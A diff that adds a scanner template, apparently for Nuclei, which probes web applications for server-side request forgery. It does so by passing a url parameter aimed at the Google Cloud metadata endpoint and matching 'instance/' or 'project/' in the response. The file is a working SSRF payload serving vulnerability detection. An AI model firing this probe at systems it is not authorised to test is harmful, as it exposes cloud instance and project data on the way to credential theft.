@@ -1,0 +1,23 @@
+id: whai-ssrf-gcp-metadata
+
+info:
+  name: SSRF to GCP Metadata Service
+  author: whitehat-ai
+  severity: critical
+  description: Tests SSRF reaching GCP metadata
+  tags: ssrf,gcp,cloud,critical
+  classification:
+    cwe-id: CWE-918
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://metadata.google.internal/computeMetadata/v1/"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "instance/"
+          - "project/"
+        condition: or
